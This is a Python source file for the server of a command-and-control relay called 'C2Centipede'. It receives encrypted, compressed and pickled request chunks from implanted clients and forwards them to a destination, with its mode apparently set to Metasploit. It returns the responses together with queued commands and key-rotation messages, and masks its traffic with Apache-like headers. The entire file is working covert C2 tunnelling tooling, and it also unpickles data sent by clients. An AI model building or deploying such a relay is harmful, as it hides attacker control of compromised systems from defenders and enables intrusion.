#!/usr/bin/env python3

import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import re
import zlib
from cryptography.fernet import Fernet
import random
import pickle
import requests
from datetime import datetime
from utils.sounddevice_test import beep

remotehostport = ""
serviceauthentication = ""
fernetKey = ""
clients = {}

def checksum8(str):
    return sum(map(ord, str)) % 0x100

class C2CentipedeClient():
    def __init__(self,sessionid,fernetKey):
        print("created client with session and key",sessionid,fernetKey)
        self.sessionid = sessionid
        self.fernetkey = fernetKey
        self.lasumadict = {"a": None}
        self.aftersendlist = []
        self.donext = False
        self.piggybacks = []
        self.MODE = "METASPLOIT"
        self.starttime = datetime.now()

    def decrypt(self,tokenbytes):
        return Fernet(self.fernetkey).decrypt(tokenbytes)

    def encrypt(self, data):
        return Fernet(self.fernetkey).encrypt(data)

    def do_after_send(self):
        for x in self.aftersendlist:
            if x[0] == "rotatekey":
                self.fernetkey = x[1]
                print(b"NEW FERNET KEY: " + self.fernetkey)
            self.aftersendlist.remove(x)
        return True

    def make_request(self,path, method, headers={}, data=None):
        url = 'http://%s%s' % (remotehostport,path)
        print("methodurlheaders",method, url, headers, data)

        try:
            elre = requests.request(method, url, stream=True, headers=headers, allow_redirects=False,data=data)
            return elre
        except:
            import sys
            print("EXCEPTION")
            print(sys.exc_info()[1])

class C2CentipedeHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        return

    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def rotateKey(self,client):
        thekey = Fernet.generate_key()
        client.aftersendlist.append(("rotatekey",thekey))
        print("ROTATINGKEY")
        return thekey

    def do_PUT(self):
        try:
            authorization_header = self.headers.get('Authorization')
            basicauth = authorization_header.split(" ")[1]
            basicauth = base64.b64decode(basicauth)
            assert basicauth == serviceauthentication
            print("auth true", basicauth,serviceauthentication)
        except:
            print("bad auth", basicauth,serviceauthentication)
            self._set_response()
            self.wfile.write("".format(self.path).encode('utf-8'))
            return

        piggybackmsg = bytes(self.path,"UTF-8")
        print("piggyback",piggybackmsg)
        print("clients",clients)
        client = clients[piggybackmsg.split(b"/")[1].decode("utf-8")]
        print("client",client)
        print("PIGGYBACK")
        print(piggybackmsg)
        piggybackmsg = b"/" + b"/".join(piggybackmsg.split(b"/")[2:])
        print("reconstructed piggyback", piggybackmsg)
        thiskey = None
        if piggybackmsg==b"/rotateKey":
            #print("inside if")
            thiskey = self.rotateKey(client)
            piggybackmsg = b"/rotateKey('%s')" % (thiskey)
            client.piggybacks.append(piggybackmsg)
            #print(thiskey)
            print(piggybackmsg)

        else:
            print("appending", piggybackmsg)
            client.piggybacks.append(piggybackmsg)

        self._set_response()
        self.wfile.write("PUT request for {}".format(self.path).encode('utf-8'))

    def do_GET(self):
        self._set_response()
        if self.path == '/clients':
            self.wfile.write(str([c+"->"+clients[c].starttime.strftime("%m/%d/%Y %H:%M:%S") for c in clients.keys()]).encode("utf-8"))
        else:
            self.wfile.write("surprisedpikachu.jpg".encode('utf-8'))

    def do_POST(self):
        if shouldbeep:
            beep(checksum8(self.headers["Host"]))
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself

        sessionid, chunk_number = re.search("""Cookie: sessionid=(.*)""",str(self.headers)).group(0).split(".")
        sessionid = sessionid.split("=")[1]

        #if the sessionid sent in the cookie by the client is not found, then send him one
        if sessionid not in clients.keys():
            import string
            #create a new random id
            sessionid = ''.join(random.choice("abcdef" + string.digits) for _ in range(64))
            #add the client to our client list
            client = C2CentipedeClient(sessionid,args.fernetKey)
            clients[sessionid] = client

            #set the session on the client
            client.piggybacks.append(b"/setSessionID('%s')" % (sessionid.encode("UTF-8")))
            he = {'Content-Type': 'application/octet-stream', 'Connection': 'close', 'Server': 'Apache', 'Content-Length': '0'}
            elret = base64.b64encode(zlib.compress(client.encrypt(pickle.dumps(({"content": b"noksessid", "headers": he}, client.piggybacks), protocol=2)), 9))
            self._set_response()
            self.wfile.write(elret)
            client.do_after_send()
            piggybacks = []
            return

        #if the sessionid is found in our client list
        else:
            client = clients[sessionid]

        assert(client)

        client.lasumadict[chunk_number] = post_data

        #a means that it is the last chunk
        if chunk_number == "a":

            textcolor=random.choice(["31","32","33","34"])
            print(client.lasumadict)
            print("\033[1;%sm%s\033[0;0m" % (textcolor,client.decrypt(zlib.decompress(base64.b64decode(b"".join([client.lasumadict[x] for x in sorted(client.lasumadict.keys())]))))))

            lasumadecoded = client.decrypt(zlib.decompress(base64.b64decode(b"".join([client.lasumadict[x] for x in sorted(client.lasumadict.keys())]))))
            sendata = pickle.loads(lasumadecoded,encoding="bytes")#added encoding param for python2 compat
            print("sendata",sendata)
            r = client.make_request(*sendata)

            if dict(r.headers) == {'Content-Type': 'application/octet-stream', 'Connection': 'close', 'Server': 'Apache', 'Content-Length': '0'} and len(client.piggybacks) == 0:
                elret = b"AOK"

            else:
                elret = base64.b64encode(zlib.compress(client.encrypt(pickle.dumps(({"content":r.content,"headers":dict(r.headers)},client.piggybacks),protocol=2)), 9))
                client.piggybacks = []

            print(elret)
            self._set_response()
            self.wfile.write(elret)
            client.do_after_send()

        else:
            self._set_response()
            self.wfile.write(b"NOOK")
            client.do_after_send()


def run(server_class=HTTPServer, handler_class=C2CentipedeHandler, port=8080):
    logging.basicConfig(level=logging.NOTSET)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')


if __name__ == '__main__':
    import argparse

    banner = """
:'######:::'#######:::'######::'########:'##::: ##:'########:'####:'########::'########:'########::'########:
'##... ##:'##.... ##:'##... ##: ##.....:: ###:: ##:... ##..::. ##:: ##.... ##: ##.....:: ##.... ##: ##.....::
 ##:::..::..::::: ##: ##:::..:: ##::::::: ####: ##:::: ##::::: ##:: ##:::: ##: ##::::::: ##:::: ##: ##:::::::
 ##::::::::'#######:: ##::::::: ######::: ## ## ##:::: ##::::: ##:: ########:: ######::: ##:::: ##: ######:::
 ##:::::::'##:::::::: ##::::::: ##...:::: ##. ####:::: ##::::: ##:: ##.....::: ##...:::: ##:::: ##: ##...::::
 ##::: ##: ##:::::::: ##::: ##: ##::::::: ##:. ###:::: ##::::: ##:: ##:::::::: ##::::::: ##:::: ##: ##:::::::
. ######:: #########:. ######:: ########: ##::. ##:::: ##::::'####: ##:::::::: ########: ########:: ########:
:......:::.........:::......:::........::..::::..:::::..:::::....::..:::::::::........::........:::........::
:'######::'########:'########::'##::::'##:'########:'########::
'##... ##: ##.....:: ##.... ##: ##:::: ##: ##.....:: ##.... ##:
 ##:::..:: ##::::::: ##:::: ##: ##:::: ##: ##::::::: ##:::: ##:
. ######:: ######::: ########:: ##:::: ##: ######::: ########::
:..... ##: ##...:::: ##.. ##:::. ##:: ##:: ##...:::: ##.. ##:::
'##::: ##: ##::::::: ##::. ##:::. ## ##::: ##::::::: ##::. ##::
. ######:: ########: ##:::. ##:::. ###:::: ########: ##:::. ##:
:......:::........::..:::::..:::::...:::::........::..:::::..::"""
    print(banner)
    parser = argparse.ArgumentParser(description="Do something.")
    parser.add_argument('-p','--bindPort', type=int, required=True)
    parser.add_argument('-d','--DestinationHostPort', required=True)
    parser.add_argument('-a','--authenticationCreds', required=True)
    parser.add_argument('-f','--fernetKey', required=False)

    parser.add_argument('-b','--beep', dest='beep', action='store_true')
    parser.add_argument('--no-beep', dest='beep', action='store_false')
    parser.set_defaults(beep=False)

    args = parser.parse_args()

    shouldbeep = args.beep
    remotehostport = args.DestinationHostPort
    serviceauthentication = args.authenticationCreds.encode("UTF-8")

    if args.fernetKey == None:
        args.fernetKey = Fernet.generate_key()
        print((b"Fernet key was not specified (-f flag), so I generated one. Be sure to add in c2c_client '-f " + args.fernetKey+b"'").decode())
    else:
        print("Running with Fernet key ", args.fernetKey)

    run(port=args.bindPort)